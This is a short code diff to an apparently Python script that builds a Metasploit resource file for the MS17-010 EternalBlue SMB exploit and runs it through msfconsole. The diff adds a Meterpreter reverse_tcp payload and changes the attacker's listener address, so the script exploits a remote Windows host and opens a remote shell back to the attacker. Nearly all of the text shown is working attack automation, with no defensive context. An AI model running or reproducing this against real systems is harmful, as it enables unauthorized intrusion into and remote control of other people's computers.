@@ -18,6 +18,8 @@ def Handler(configFile, lhost, lport, rhost):  #漏洞利用参数
 
     configFile.write('use exploit/windows/smb/ms17_010_eternalblue\n')
 
+    configFile.write('set payload windows/x64/meterpreter/reverse_tcp\n')
+
     configFile.write('set LPORT ' + str(lport) + '\n')
 
     configFile.write('set LHOST ' + str(lhost) + '\n')
@@ -50,7 +52,7 @@ def main():
 
     configFile = open('ms17_010.rc', 'w')
 
-    lhost = '192.168.1.216'
+    lhost = '192.168.186.129'
 
     lport = 4444
 
@@ -63,7 +65,5 @@ def main():
     os.system('msfconsole -q -r ms17_010.rc')
 
     writedb()
-
-
 
 main()
